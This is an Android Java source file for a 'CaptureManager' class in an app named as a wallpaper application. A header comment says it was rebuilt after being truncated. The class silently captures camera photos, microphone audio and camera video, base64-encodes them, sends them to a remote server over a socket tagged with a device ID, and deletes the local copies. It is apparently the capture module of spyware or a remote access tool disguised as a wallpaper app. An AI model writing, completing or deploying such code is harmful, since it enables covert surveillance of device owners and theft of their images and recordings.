package com.example.wallpaperapplication;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import io.socket.client.Socket;

/**
 * FIX Bug 4 — CaptureManager was truncated mid-class.
 * Rebuilt with Camera2 image capture, video capture, and audio capture.
 * Uses the parent service's socket to emit captured media.
 */
public class CaptureManager {

    private static final String TAG = "CaptureManager";
    private final Context context;
    private Socket socket;
    private String deviceId;

    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    public CaptureManager(Context context, Socket socket, String deviceId) {
        this.context = context;
        this.socket = socket;
        this.deviceId = deviceId;
        startBackgroundThread();
    }

    public void setSocket(Socket socket) {
        this.socket = socket;
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CaptureBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    public void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try { backgroundThread.join(); } catch (InterruptedException ignored) {}
            backgroundThread = null;
            backgroundHandler = null;
        }
    }

    // ─────────────────────────────────────────────────────────
    // Image Capture (Camera2)
    // ─────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    public void captureImage(String cameraFacing) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "CAMERA permission not granted");
            return;
        }

        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        try {
            String cameraId = selectCamera(cameraManager, cameraFacing);
            if (cameraId == null) {
                Log.e(TAG, "No camera found for facing: " + cameraFacing);
                return;
            }

            Size captureSize = new Size(1280, 720);
            final ImageReader imageReader = ImageReader.newInstance(
                    captureSize.getWidth(), captureSize.getHeight(),
                    ImageFormat.JPEG, 2);

            imageReader.setOnImageAvailableListener(reader -> {
                try (Image image = reader.acquireLatestImage()) {
                    if (image == null) return;
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
                    emitMedia("image", base64, "jpg");
                } catch (Exception e) {
                    Log.e(TAG, "Image read error", e);
                }
                imageReader.close();
            }, backgroundHandler);

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    try {
                        List<android.view.Surface> surfaces = Collections.singletonList(imageReader.getSurface());
                        camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                try {
                                    CaptureRequest.Builder builder =
                                            camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    builder.addTarget(imageReader.getSurface());
                                    builder.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
                                    session.capture(builder.build(), null, backgroundHandler);
                                } catch (CameraAccessException e) {
                                    Log.e(TAG, "Capture request error", e);
                                    camera.close();
                                }
                            }

                            @Override
                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                Log.e(TAG, "Session configure failed");
                                camera.close();
                            }
                        }, backgroundHandler);
                    } catch (CameraAccessException e) {
                        Log.e(TAG, "createCaptureSession error", e);
                        camera.close();
                    }
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Camera error: " + error);
                    camera.close();
                }
            }, backgroundHandler);

        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera access error", e);
        }
    }

    // ─────────────────────────────────────────────────────────
    // Audio Capture (MediaRecorder)
    // ─────────────────────────────────────────────────────────

    public void captureAudio(int durationSeconds) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "RECORD_AUDIO permission not granted");
            return;
        }

        backgroundHandler.post(() -> {
            File outputFile = new File(context.getCacheDir(),
                    "audio_" + System.currentTimeMillis() + ".m4a");

            MediaRecorder recorder = new MediaRecorder();
            try {
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setAudioSamplingRate(44100);
                recorder.setAudioEncodingBitRate(128000);
                recorder.setMaxDuration(durationSeconds * 1000);
                recorder.setOutputFile(outputFile.getAbsolutePath());
                recorder.setOnInfoListener((mr, what, extra) -> {
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        mr.stop();
                        mr.release();
                        encodeAndEmitFile(outputFile, "audio", "m4a");
                    }
                });
                recorder.prepare();
                recorder.start();
            } catch (IOException e) {
                Log.e(TAG, "Audio capture error", e);
                recorder.release();
            }
        });
    }

    // ─────────────────────────────────────────────────────────
    // Video Capture (Camera2 + MediaRecorder)
    // ─────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    public void captureVideo(int durationSeconds, String cameraFacing) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "CAMERA or RECORD_AUDIO permission not granted");
            return;
        }

        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        backgroundHandler.post(() -> {
            try {
                String cameraId = selectCamera(cameraManager, cameraFacing);
                if (cameraId == null) return;

                File outputFile = new File(context.getCacheDir(),
                        "video_" + System.currentTimeMillis() + ".mp4");

                MediaRecorder recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setVideoSize(1280, 720);
                recorder.setVideoFrameRate(30);
                recorder.setVideoEncodingBitRate(3_000_000);
                recorder.setMaxDuration(durationSeconds * 1000);
                recorder.setOutputFile(outputFile.getAbsolutePath());
                recorder.prepare();

                android.view.Surface recorderSurface = recorder.getSurface();

                cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        try {
                            CaptureRequest.Builder builder =
                                    camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                            builder.addTarget(recorderSurface);

                            camera.createCaptureSession(
                                    Collections.singletonList(recorderSurface),
                                    new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(@NonNull CameraCaptureSession session) {
                                            try {
                                                session.setRepeatingRequest(builder.build(), null, backgroundHandler);
                                                recorder.start();
                                                recorder.setOnInfoListener((mr, what, extra) -> {
                                                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                                                        mr.stop();
                                                        mr.release();
                                                        camera.close();
                                                        encodeAndEmitFile(outputFile, "video", "mp4");
                                                    }
                                                });
                                            } catch (CameraAccessException e) {
                                                Log.e(TAG, "Video session error", e);
                                                camera.close();
                                            }
                                        }

                                        @Override
                                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                            Log.e(TAG, "Video session configure failed");
                                            camera.close();
                                        }
                                    }, backgroundHandler);
                        } catch (CameraAccessException e) {
                            Log.e(TAG, "Video camera error", e);
                            camera.close();
                        }
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }

                    @Override
                    public void onError(@NonNull CameraDevice camera, int error) {
                        Log.e(TAG, "Video camera error: " + error);
                        camera.close();
                    }
                }, backgroundHandler);

            } catch (Exception e) {
                Log.e(TAG, "Video capture error", e);
            }
        });
    }

    // ─────────────────────────────────────────────────────────
    // Helpers
    // ─────────────────────────────────────────────────────────

    private String selectCamera(CameraManager manager, String facing) throws CameraAccessException {
        int wantedFacing = "front".equalsIgnoreCase(facing)
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;
        for (String id : manager.getCameraIdList()) {
            CameraCharacteristics chars = manager.getCameraCharacteristics(id);
            Integer lensFacing = chars.get(CameraCharacteristics.LENS_FACING);
            if (lensFacing != null && lensFacing == wantedFacing) return id;
        }
        // Fallback: return first available
        String[] ids = manager.getCameraIdList();
        return ids.length > 0 ? ids[0] : null;
    }

    private void encodeAndEmitFile(File file, String mediaType, String ext) {
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
            emitMedia(mediaType, base64, ext);
        } catch (IOException e) {
            Log.e(TAG, "Encode error", e);
        } finally {
            file.delete();
        }
    }

    private void emitMedia(String mediaType, String base64Data, String ext) {
        if (socket == null || !socket.connected()) {
            Log.w(TAG, "Socket not connected, dropping " + mediaType);
            return;
        }
        try {
            JSONObject payload = new JSONObject();
            payload.put("deviceId", deviceId);
            payload.put("type", mediaType);
            payload.put("data", base64Data);
            payload.put("ext", ext);
            payload.put("timestamp", System.currentTimeMillis());
            socket.emit("media-captured", payload);
            Log.d(TAG, "Emitted " + mediaType + " capture");
        } catch (Exception e) {
            Log.e(TAG, "Emit error", e);
        }
    }
}
